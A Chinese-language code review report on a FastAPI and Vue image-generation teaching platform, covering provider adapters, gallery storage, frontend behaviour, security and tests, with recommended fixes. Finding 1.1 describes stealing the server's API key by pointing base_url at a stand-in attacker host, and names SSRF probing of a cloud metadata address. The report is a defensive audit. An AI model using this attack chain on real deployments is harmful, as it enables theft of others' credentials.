# OilPaintingPlatform 代码审阅报告（2026-11-09）

约 42 个源文件（25 py + 17 前端文件 + 4 个数据 JSON）均已逐一通读。以下为按模块组织的审阅报告，所有发现均基于实际读到的代码。

---

## 一、模块结构（每模块一行职责）

**后端（FastAPI）**

| 模块 | 职责 |
|---|---|
| `backend/app/main.py` | 应用工厂：CORS 中间件、注册 7 个路由、挂载 `/files` 静态目录（output/） |
| `backend/app/config.py` | pydantic-settings 配置：读 `.env`、各 provider Key/endpoint、超时、输出目录 |
| `backend/app/schemas.py` | Pydantic 模型：生成请求/响应、风格、教学文章、画廊条目、provider 元信息 |
| `backend/app/routers/generate.py` | `POST /api/generate` 核心接口，计时 + 400/502 错误映射 |
| `backend/app/routers/{styles,prompts,teaching,gallery,providers,health}.py` | 各只读数据接口 + provider 元信息 + 健康检查 |
| `backend/app/services/prompt_builder.py` | 提示词合成引擎：用户词 + 风格关键词 + 媒介提示 + 参考艺术家 + 负面词 |
| `backend/app/services/prompt_service.py` / `teaching_service.py` | 从 JSON 加载（lru_cache）提示词模板 / 教学文章 |
| `backend/app/services/generate_service.py` | 生成编排：选 provider → 生成 → 写入 gallery.json（读改写、上限 200 条） |
| `backend/app/services/providers/base.py` | 抽象基类 + 注册表 + `get_provider` 回退逻辑 + 图片落盘工具 |
| `backend/app/services/providers/{mock,pollinations,openai,dashscope,zhipu,sdwebui}_provider.py` | 6 个视觉大模型适配器 |

**前端（Vue 3）**

| 模块 | 职责 |
|---|---|
| `frontend/src/api/index.js` | Axios 客户端（baseURL `/api`，180s 超时），10 个 API 函数 |
| `frontend/src/stores/app.js` | Pinia store：bootstrap 一次性并行拉取 styles/health/articles/prompts，providers 每次刷新 |
| `frontend/src/views/Create.vue` | 核心创作页：可折叠风格/模型选择器、provider 设置 UI（localStorage 凭据）、提示词库、合成预览、下载按钮 |
| `frontend/src/views/{Home,Teaching,Article,Gallery,About}.vue` | 首页 / 教学列表（分类过滤）/ 文章详情（手写 markdown 渲染）/ 画廊 / 关于 |
| `frontend/src/components/{NavBar,SiteFooter,StyleCard}.vue` | 导航、页脚、风格卡片（**StyleCard 实际未被任何模板使用**） |
| `frontend/src/router/index.js` / `main.js` / `App.vue` / `vite.config.js` | 路由 + 标题 / 入口 / 布局 + bootstrap / Vite（`/api`、`/files` 代理到 8000） |

---

## 二、逐模块审阅发现

### 模块 1：Provider 抽象层（base.py + 6 providers）

**1.1【critical】用户可控 `base_url` + 服务端 env Key = 服务器 Key 外泄通道**
- **位置**：`backend/app/services/providers/base.py:32-41` + `openai_provider.py:31-47`（zhipu 同理）
- **问题**：`api_key` 属性在 credentials 未提供时回退到 `.env` 中的服务器 Key，而 `base_url` 属性允许请求方任意覆盖。三者组合：客户端只传 `credentials={"base_url": "https://attacker.example"}`、选 `provider="openai"`，若服务器配置了 `OPENAI_API_KEY`，后端会把 `Authorization: Bearer <服务器所有者的真实 Key>` POST 到攻击者指定的任意 URL。`/api/generate` 完全无鉴权，任何能访问该后端的人都能如此窃取服务器上的 OpenAI/智谱 Key。`base_url` 也无 scheme/目标校验，同时构成 SSRF 探测内网（如 `http://169.254.169.254/`）的入口。
- **建议**：当使用 env Key（即客户端未自带 api_key）时，禁止覆盖 `base_url`，或对 `base_url` 做白名单校验（只允许 https + 已知域名后缀）；更彻底的做法是"客户端凭据走客户端 base_url，服务端凭据走服务端 base_url"两条路径互斥。生产部署必须加鉴权。

**1.2【high】DashScope 轮询用了 env Key 而不是实例凭据——前端配 Key 的流程必挂**
- **位置**：`backend/app/services/providers/dashscope_provider.py:63`
  ```python
  poll_headers = {"Authorization": f"Bearer {settings.dashscope_api_key}"}
  ```
- **问题**：提交任务用 `self.api_key`（第 36 行，支持前端传入的凭据），但轮询硬编码读 `settings.dashscope_api_key`。用户在前端设置面板填了 DashScope Key 而服务器 `.env` 没配时：提交成功 → 轮询 401 → `raise_for_status()` 抛错 → 502。整条前端配置链路对 dashscope 实际不可用，且测试完全没有覆盖该 provider，所以没被发现。
- **建议**：改为 `f"Bearer {self.api_key}"`，并补一条"credentials 提交 + 轮询使用同一 Key"的单元测试（mock httpx 即可）。

**1.3【medium】无任何重试机制；Pollinations 免费端点易抖动**
- **位置**：`pollinations_provider.py:39-40`、`openai_provider.py:44-47`、`zhipu_provider.py:48-51` 等
- **问题**：所有外部调用都是"一次失败即 502"。Pollinations 免费端点常见 429/5xx/超时，用户会频繁看到 `Image generation failed: ...`。另外 pollinations 的 `negative_prompt` 被**静默丢弃**（openai/zhipu 同样），用户在 UI 里看到的负面词设置对这 3 个 provider 无效却没有任何提示。
- **建议**：对幂等 GET（pollinations）加 2-3 次指数退避重试（httpx 内建 `transport=httpx.HTTPTransport(retries=N)` 可直接用）；在 `GenerateResponse` 里返回"本 provider 忽略了负面词"之类的告知字段，或在前端按 provider 隐藏负面词入口。

**1.4【medium】Pollinations 用 `hash()` 生成 seed——跨进程不可复现，且 seed 语义存疑**
- **位置**：`pollinations_provider.py:37,47`：`seed={hash(prompt) % 1000000 + i}`
- **问题**：Python 对 str 的 `hash()` 受 `PYTHONHASHSEED` 随机化影响，每次重启进程结果不同，同一 prompt 两次部署得到的图不同——对"教学演示可复现"这一场景是缺陷；同一表达式在 37 行和 47 行重复计算两次。
- **建议**：改用与 mock_provider 一致的 `int(hashlib.md5(prompt.encode()).hexdigest()[:8], 16) % 1000000`，并提取成局部变量只算一次。

**1.5【medium】SD WebUI `available()` 每次生成请求都同步发一次 HTTP 探测**
- **位置**：`sdwebui_provider.py:32-40`，被 `base.py:141` 在每个 generate 请求里调用
- **问题**：SD WebUI 未启动时，每个选择 sdwebui 的请求都要等 5 秒 TCP 超时才回退到 mock；`get_provider` 对 sdwebui 的可用性判断没有缓存。
- **建议**：给 `available()` 结果加 30-60 秒 TTL 缓存；或将探测改为后台定时任务，请求时只读缓存状态。

**1.6【low】`file_url` 死代码；`base_url` 属性对 dashscope 无效**
- **位置**：`base.py:88`（`rel = path.relative_to(...)` 计算后从未使用）；`dashscope_provider.py:18,51,67` 使用模块常量 `DASHSCOPE_API` 而非 `self.base_url`（虽然 `needs_base_url=False`，UI 一致性尚可，但与其它 provider 行为不统一）。
- **建议**：删除死变量；dashscope 统一走 `self.base_url`（其 default_base_url 已经定义好了，第 26 行）。

**1.7【low】zhipu 下载失败静默回退到远程 URL，画廊会"烂图"**
- **位置**：`zhipu_provider.py:83-88`：`except Exception: images.append(GeneratedImage(url=url_val, ...))`
- **问题**：远程 URL 通常有有效期（云厂商签名 URL 数小时到一天失效），条目进 gallery.json 后链接很快失效，画廊展示破图。
- **建议**：下载失败时应明确报错（或至少在 GalleryItem 标记 `remote=True`），不要静默写入画廊。

### 模块 2：生成编排与路由（generate_service / routers）

**2.1【high】gallery.json 读-改-写无锁，并发请求丢数据；且把运行时可变数据写进源码目录**
- **位置**：`backend/app/services/generate_service.py:65-97`（`_append_gallery`）、`config.py:20`（`DATA_DIR = app/data`）
- **问题**：(a) 两个并发 generate 同时读到同一份 `existing`，各自追加后互相覆盖，后写者胜出，先写者的记录丢失——FastAPI sync 端点跑在线程池里，真实并发存在；(b) gallery.json 是 git 跟踪的源码数据文件（`git ls-files` 确认在列），每次生成都会弄脏工作区，且其中引用的 `output/` 图片被 `.gitignore` 忽略——**fresh clone 后画廊展示的 8 张图全部 404**（gallery.json 里引用的 `/files/1792499074884_*.svg` 等文件不在仓库中）。
- **建议**：加 `threading.Lock` 或改用 SQLite/独立可写数据目录；gallery.json 加入 `.gitignore`，仓库里留一个空数组版本；或者干脆从 git 中移除现有 8 条开发期数据。

**2.2【medium】`/api/generate` 错误响应直接透传原始异常文本，可能泄露内部信息且对中文用户不友好**
- **位置**：`backend/app/routers/generate.py:18-19`
  ```python
  raise HTTPException(status_code=502, detail=f"Image generation failed: {e}")
  ```
- **问题**：`httpx.HTTPStatusError` 的字符串包含完整上游 URL 和响应体片段——如果用户在 base_url 里嵌了 token（常见于某些中转服务），它会原样回显给客户端；同时前端把这段英文堆栈直接展示给中文用户（见 4.3）。另外上游 401（Key 错误）、429（限流）、5xx 全部折叠成一个 502，前端无法区分提示。
- **建议**：按异常类型映射：`httpx.HTTPStatusError(401)` → 400"API Key 无效或未授权"；429 → 429"调用过于频繁"；连接类错误 → 502"模型服务暂时不可用"。detail 中不要拼接原始 exception 文本，改记入服务端日志（当前项目完全没有 logging，见 2.4）。

**2.3【medium】`size` 无格式校验，畸形值产生困惑错误**
- **位置**：`schemas.py:36`（`size: Optional[str]` 无 pattern 校验）；`pollinations_provider.py:30`、`sdwebui_provider.py:15-18`
- **问题**：API 直接调用传 `size="abc"` → pollinations 在 `split("x")` 处抛 `ValueError` → 被 generate.py 捕获成 400，detail 是 "not enough values to unpack (expected 2, got 1)"——技术上没崩，但对调用方完全不知所云。传 `size="1024"`（缺 x）同理。
- **建议**：`schemas.py` 加 `pattern=r"^\d{2,5}x\d{2,5}$"` 校验（422 自动给出清晰信息），provider 内的 split 就成了纯防御。

**2.4【low】后端零日志，排障全靠猜**
- **位置**：全后端 grep 确认无一处 `logging`/`print`（只有 docstring/URL 字符串匹配）
- **问题**：provider 失败时原始异常只进 HTTP 响应（一次性），服务端不留任何记录；无法回答"为什么画廊里 provider 显示 mock"这类问题。
- **建议**：在 generate 路由 except 分支加 `logger.exception(...)`，用标准 logging 即可。注意不要记录 request body（含凭据）。

**2.5【low】`get_provider` 静默回退 mock，用户在 UI 无感知降级**
- **位置**：`base.py:138-146`；`generate_service.py:49-50` 注释自己也承认 "mock fallback may differ"
- **问题**：用户选了 sdwebui/openai（Key 配错或服务未起），拿到的是一张 SVG 占位图 + 一个小小的 "mock" badge——教学演示场景可以接受，但没有任何"你选的模型不可用，已回退"的显式提示，第一次用的人会以为模型就这水平。
- **建议**：`GenerateResponse` 增加 `fallback_from: Optional[str]` 字段，前端命中时显示醒目的黄色提示条。

### 模块 3：提示词模板引擎 + 教学内容（prompt_builder / prompt_service / teaching_service / data JSON）

**3.1【low】媒介提示判断忽略风格关键词，"oil painting" 重复拼接**
- **位置**：`prompt_builder.py:55-58`（只检查 `user_prompt`）+ `styles.json` 每个风格第 1 个关键词都是 `"oil painting"`
- **问题**：`compose_prompt` 判断是否追加 "oil painting on canvas" 时只看用户原文，不看已拼入的风格关键词。结果（见 gallery.json:5 实际产物）合成提示词里出现两处 oil painting：`"...oil painting, impressionism style, ..., oil painting on canvas, in the manner of..."`。对部分模型这是冗余 token，对教学示范也显得不严谨。
- **建议**：判断条件改为检查 `parts` 拼接结果（风格关键词已含 "oil painting" 时不再追加），或把 "oil painting" 从各风格关键词中抽出统一由媒介提示处理。

**3.2【low】28 个提示词模板与 12 风格一致性靠人工维护，无校验**
- **位置**：`prompts.json`（28 条）的 `recommended_style` 字段；`prompt_service.py:16` 直接 `PromptTemplate(**item)` 构造
- **问题**：当前 28 条模板的 `recommended_style` 全部存在于 styles.json（逐条核对过，无悬空引用），但没有任何测试保证这一点——未来加模板时写错风格 ID，前端 `Create.vue:391` 的 `store.styles.find(...)` 会静默隐藏"推荐风格"badge，用户点了模板却没切风格。
- **建议**：加一个测试遍历 `list_prompts()` 断言每个 `recommended_style` 在 `list_styles()` 中存在（成本极低）。

**3.3【low】三个 JSON 服务层用 `@lru_cache` 包住带副作用隐患的加载——gallery.json 却不走缓存**
- **位置**：`prompt_builder.py:17-21`、`prompt_service.py:12-16`、`teaching_service.py:12-16`（三个正确）vs `generate_service.py:74-79`（gallery 每次全量读文件）
- **建议**：保持现状即可，优先解决 2.1。

### 模块 4：前端组件（Create.vue 重点 + 其它 views）

**4.1【high】API Key 明文存 localStorage，随每个生成请求明文上行**
- **位置**：`frontend/src/views/Create.vue:51-63`（load/saveCredentials，每次 keystroke 即 `saveCredentials()`）、`156-159`（组装进 payload）
- **问题**：(a) localStorage 中的 API Key 可被任何 XSS 读取——而本项目恰恰有一个手写的 markdown→v-html 渲染器（见 4.5），XSS 面比常规项目大；(b) 每次生成把 Key 明文放进请求体，若生产环境前后端间非 HTTPS（或用户直接访问 `http://ip:8000`），Key 可被中间人截获；(c) 页面上的说明文案（346 行）"仅发送给后端用于本次生成，不会上传到任何第三方"**不成立**——后端马上会把 Key 发给 OpenAI/智谱等第三方 API。
- **建议**：文案必须更正；强烈建议默认引导用户把 Key 配到后端 `.env`，前端 localStorage 方案标注"仅限本机开发"；输入框 `@input` 逐字符写 localStorage 也应改为 blur/change 时保存。

**4.2【medium】下载按钮对远程 URL 与无扩展名 URL 行为退化**
- **位置**：`Create.vue:116-131`（downloadImage / getFilename）
- **问题**：`download` 属性只对同源 URL 生效。当 provider 返回远程 URL（openai_provider.py:64-72 的代理分支、zhipu 的回退分支）时，点击"下载图片"实际是 `target="_blank"` 打开新标签页；且 `getFilename` 里 `img.url.split('.').pop()` 对无扩展名 URL 会把整段 URL 当扩展名，生成形如 `oilpainting-印象派-1770000000000-1.https://oaidalleapiprodscus...` 的文件名。
- **建议**：判断 `img.local_path`（后端已返回该字段）决定是下载还是打开；扩展名改为 `img.url.split('.').pop().split('?')[0]` 后再校验 `/^(png|jpe?g|svg|webp)$/`，不匹配则默认 `png`。更优方案：后端一律落盘本地（openai 的远程 URL 分支也下载），前端就只有同源一种情况。

**4.3【medium】合成提示词预览与真实发给模型的内容不一致**
- **位置**：`Create.vue:106-113`（composedPreview）vs 后端 `prompt_builder.py:46-66`
- **问题**：前端预览只拼了 `用户词 + 风格关键词 + 附加词`，缺了后端会追加的 `oil painting on canvas` 和 `in the manner of Claude Monet / ...`——而这正是本产品的核心卖点（"平台自动拼接专业提示词"），预览恰恰没展示出来。
- **建议**：要么在后端加一个 `POST /api/compose-preview` 让预览与实际一致，要么把后端合成逻辑字段（style.prompt_keywords、reference_artists）在前端补齐。

**4.4【medium】bootstrap 部分失败后 `loaded=true`，坏状态永久固化**
- **位置**：`frontend/src/stores/app.js:13-33`
- **问题**：`getStyles()` 没有 `.catch`（health/articles/prompts 都有）。首次进入时后端未启动 → getStyles 抛错 → `finally` 里 `loaded.value = true` → 之后每次 `bootstrap()` 都跳过全部数据加载。用户看到的现象是：首页风格数量为 0、创作页风格列表空白，刷新页面也一样（除非清缓存），而健康检查已恢复。
- **建议**：`loaded` 只在 `getStyles()` 成功后置 true（把 styles 的赋值放在 try 内并单独 catch 记 error），或提供显式重试按钮。

**4.5【medium】Article.vue 手写 markdown 渲染器 + v-html：当前内容安全，但结构性风险 + 已有渲染缺陷**
- **位置**：`frontend/src/views/Article.vue:35`（`v-html="renderMarkdown(...)"`）、`41-69`
- **问题**：(a) 安全面——渲染前确实转义了 `& < >`（44 行），当前 6 篇文章内容不可注入；但这是个自研转义器，一旦未来内容来源变化（用户投稿、CMS）就是 XSS 直通车，与 4.1 的 localStorage Key 叠加后果严重；(b) 功能缺陷——`teaching.json:48` 的文章里使用了 `> 引用`（渲染成字面 `&gt;`）和 `*visible brushstrokes*` 斜体（渲染成字面星号），页面显示明显不对；`**` 的正则替换（66 行）作用于含标签的整体 HTML，跨段落匹配会产出 `<strong>a</p><p>b</strong>` 非法嵌套。
- **建议**：换成 `marked` + `DOMPurify`（或 `markdown-it`），体积代价小，一次性消除三类问题；若坚持自研，至少把 `**` 替换移到逐行转义后、拼 HTML 前进行。

**4.6【low】Gallery/Teaching/Article 网络失败被误报为"空数据/文章未找到"**
- **位置**：`Gallery.vue:8-14`（失败 → items 空 → 显示"画廊还是空的"）、`Teaching.vue:20-26`（同理）、`Article.vue:10-17`（getArticle 抛错 → article 为 null → 显示"文章未找到"，且 promise rejection 未 catch）
- **问题**：后端宕机时用户得到的提示是语义错误的（"画廊还是空的，去创作吧！"），诱导用户做无意义的操作。
- **建议**：加 `error` ref，catch 中置位并展示"加载失败，请检查网络/后端服务"，与空态区分。

**4.7【low】StyleCard 组件是死代码**
- **位置**：`Create.vue:5`（`import StyleCard` 但模板中无 `<StyleCard>`，全仓库 grep 确认无使用）；`components/StyleCard.vue` 整个文件未被引用
- **建议**：删除 import 及组件文件，或恢复使用（风格折叠列表里每项手写了一遍类似结构，本可复用 StyleCard）。

**4.8【low】前端固定 `n: 1`，后端 `n≤4` 能力闲置；尺寸下拉与各 provider 支持范围不匹配**
- **位置**：`Create.vue:154`（n: 1 硬编码）、`168`（sizes 含 `768x768`、`512x512`）
- **问题**：DALL·E 3 只支持 1024x1024 / 1024x1792 / 1792x1024，wanx-v1 只支持 1024\*1024 / 720\*1280 / 1280\*720——用户选了 openai + 768x768 会收到上游 400 转成的 502 英文报错；选 512x512 同理。UI 不按所选 provider 过滤可用尺寸。
- **建议**：在 `ProviderInfo`（后端已有该元数据机制）里加 `supported_sizes` 列表，前端按当前 provider 动态渲染尺寸选项；n 参数可在 UI 暴露 1-4。

### 模块 5：CORS / 安全 / 配置

**5.1【medium】`/api/generate` 无鉴权 + 无限流 = 服务器 Key 的公开消耗入口**
- **位置**：`main.py`（无任何认证中间件）、`routers/generate.py:11`
- **问题**：与 1.1 组合：只要部署者把付费 Key 放进 `.env`，任何知道地址的人都能无限次免费使用其 Key 生成图片（不传 credentials 时后端自动用 env Key）。本地图生成还附带磁盘写入（每图一个文件，`output/` 无清理机制，22 个文件已积累）。
- **建议**：加最简单的 API Key 头校验或 `slowapi` 限流（如每 IP 每分钟 5 次）；`.env` 方案的文档中明确警告"配置 Key 前请勿暴露端口到公网"。

**5.2【low】CORS 配置整体健康，但 `allow_credentials=True` 无必要且 `debug` 默认 True**
- **位置**：`main.py:19-25`、`config.py:33`
- **问题**：项目不使用 cookie/session，`allow_credentials=True` 徒增风险面。`debug: bool = True` 作为生产默认值不妥。
- **建议**：去掉 `allow_credentials`；`debug` 默认 False；README 补一句 `CORS_ORIGINS` 的 JSON 数组格式说明。
- **说明（正面）**：Key 管理的基线是好的——`.env` 在 `.gitignore`（第 3 行）且 `git ls-files` 确认无 `.env` 被提交、无硬编码 Key（全后端 grep 无 `sk-`/`Bearer "字面量"`）、后端任何接口都不回显 Key（`/api/providers` 只返回 needs_api_key 布尔值和 default_base_url）、无日志打印 Key（因为根本没有日志）。泄露风险全部来自 1.1 和 4.1 两条链路。

**5.3【low】`GeneratedImage.local_path` 把服务器绝对路径返回给客户端**
- **位置**：`schemas.py:51` + 各 provider 赋值处（如 `mock_provider.py:88`：`"D:\\...\\output\\xxx.svg"`）
- **问题**：路径信息泄露（可推断服务器目录结构/OS），前端也完全不需要它（核对过 Create.vue 只用 `img.url`）。
- **建议**：从响应模型中移除，或改为仅在服务端日志中使用。

### 模块 6：测试（tests/test_backend.py）

**6.1【medium】覆盖严重不均：只有 prompt_builder + registry + mock 三个组件，五条主干链路零覆盖**
- **位置**：`tests/test_backend.py`（190 行全部内容）
- **盲区清单**（均为实际无测试的代码）：
  1. **7 个路由端点**——没有一行 TestClient 测试（400/404/502 映射、Pydantic 校验全未验证）；
  2. **5 个真实 provider**——`dashscope` 的轮询凭据 bug（1.2）只要有一个"mock httpx 后用 credentials 构造 provider"的测试就能抓住；
  3. **`_append_gallery`**——并发写、200 条截断、JSON 损坏容错全未测（generate_service.py:74-79 的损坏回退逻辑是白写的）；
  4. **`pollinations_provider`**——免费 provider 是默认卖点之一，`size.split("x")` 的畸形输入行为未测；
  5. **前端**——无任何组件/E2E 测试，`bootstrap` 失败固化（4.4）这类状态机 bug 正是组件测试的主场。
- **建议**：优先补 (1) 路由层 TestClient 冒烟 + (2) dashscope 凭据链路单测，两者都是低成本高回报。

**6.2【low】两个测试自身有质量问题**
- **位置**：`test_backend.py:184-189`（`test_generate_deterministic_colors` 的断言是 `... == ... or True`——恒真，测了等于没测）；`133`（`mock_entry["free"] is False or mock_entry["free"] is True`——恒真断言，注释还自嘲"字段存在"）；`15-16`（`sys.path.insert` hack，应改用 `pyproject.toml` 的 pytest 配置）
- **建议**：seed 断言改为比较两次 `_svg()` 输出 bytes 相等；free 字段断言改为 `assert isinstance(mock_entry["free"], bool)`。

**6.3【low】`requirements.txt` 缺 pytest；无 pytest 配置文件**
- **位置**：`requirements.txt`（5 个依赖全是运行时）；仓库无 `pyproject.toml`/`pytest.ini`/`conftest.py`
- **问题**：新环境 `pip install -r requirements.txt && pytest` 直接失败（No module named pytest）。
- **建议**：加 `requirements-dev.txt` 或 pyproject 的 dev extras；用 pyproject 配 `pythonpath` 取代 sys.path hack。

---

## 三、总体评价 + 优先改进 Top 3

**总体评价**：这是一个**完成度和结构都相当好的教学型全栈项目**：provider 注册表 + 抽象基类的多模型适配设计干净（新增 provider 只需一个类 + 一行注册）；Key 的静态管理基线合格（无硬编码、无提交、无回显、无日志泄露——重点排查过这四条）；mock 回退让零配置演示体验完整；数据内容（12 风格/28 模板/6 文章）质量高且互相一致；前端可折叠选择器和 provider 设置 UI 的交互设计超出同类项目平均水平。

主要短板集中在**"从个人演示走向可部署服务"的鸿沟**上：无鉴权无限流的 generate 接口 + 用户可控 base_url 构成了对服务器凭据的完整攻击链（1.1 + 5.1）；DashScope 凭据 bug（1.2）说明前端凭据这条主链路从未被真正端到端验证过；测试只覆盖了三个最简单的组件。另有一批影响体验的中等问题（超时不对称、错误透传、静默降级无提示）。

**优先改进 Top 3**：

1. **【堵住凭据泄露链，1-2 小时】** 修复 1.1（env Key 与客户端 base_url 互斥/白名单校验）+ 2.2（错误响应不透传原始异常）+ 5.1（最低限度的限流与鉴权）。这是部署前必须完成的，否则配置了付费 Key 的实例等于公开送 Key。
2. **【修复 DashScope 轮询凭据 bug（1.2）并补关键测试（6.1 的 1、2 项）】** 一行修复 + 两三个 mock httpx 的单元测试 + 路由层 TestClient 冒烟，能把"前端配置 Key"这条产品核心路径从"从未验证"变为"有回归保障"。
3. **【对齐前后端的超时、错误与降级体验】** 统一超时预算（后端最坏 240s+ vs 前端 180s，pollinations n=4 串行更甚）并在超过 120s 时提前 504；按异常类型映射友好中文错误（401→"Key 无效"、429→"稍后重试"）；`GenerateResponse` 加 `fallback_from` 让 mock 降级可见（2.4、2.5、4.3、4.8 一并处理）。这批改动小但对"错误提示用户体验"的提升最直接。
